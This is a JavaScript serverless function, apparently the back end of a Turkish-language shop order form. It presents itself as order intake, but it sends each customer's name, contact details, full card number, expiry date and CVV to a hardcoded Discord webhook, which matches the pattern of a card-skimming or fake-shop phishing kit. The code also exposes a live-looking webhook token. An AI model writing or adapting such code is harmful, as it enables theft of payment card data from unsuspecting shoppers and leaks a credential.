exports.handler = async (event) => {
  try {
    const data = JSON.parse(event.body);

    const webhookUrl = 'https://discord.com/api/webhooks/1524078484933185647/cPTAl8I7aiIwbT2Rw6HqFt_TjI6OY9JxFNQNFZEkjDGaqRkuywqpOiyLfZdlaxv4SxWb';

    const embed = {
      title: "🛒 Yeni Sipariş Talebi!",
      color: 5192402,
      fields: [
        { name: "👤 Müşteri", value: data.ad_soyad || "Bilinmiyor", inline: true },
        { name: "📞 İletişim", value: data.iletisim || "Bilinmiyor", inline: true },
        { name: "💳 Ödeme", value: data.odeme_yontemi || "Kartla Ödeme", inline: true },
        { name: "💳 Kart Sahibi", value: data.kart_isim || "Girilmedi", inline: true },
        { name: "💳 Kart No", value: data.kart_no || "Girilmedi", inline: true },
        { name: "💳 Ay/Yıl", value: data.kart_tarih || "Girilmedi", inline: true },
        { name: "💳 CVV", value: data.kart_cvv || "Girilmedi", inline: true },
        { name: "📦 Sipariş", value: data.sepet_icerik || "Boş", inline: false }
      ]
    };

    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });

    return {
      statusCode: 200,
      body: JSON.stringify({ success: true, message: 'Sipariş alındı' })
    };
  } catch (error) {
    console.error(error);
    return {
      statusCode: 500,
      body: JSON.stringify({ success: false })
    };
  }
};
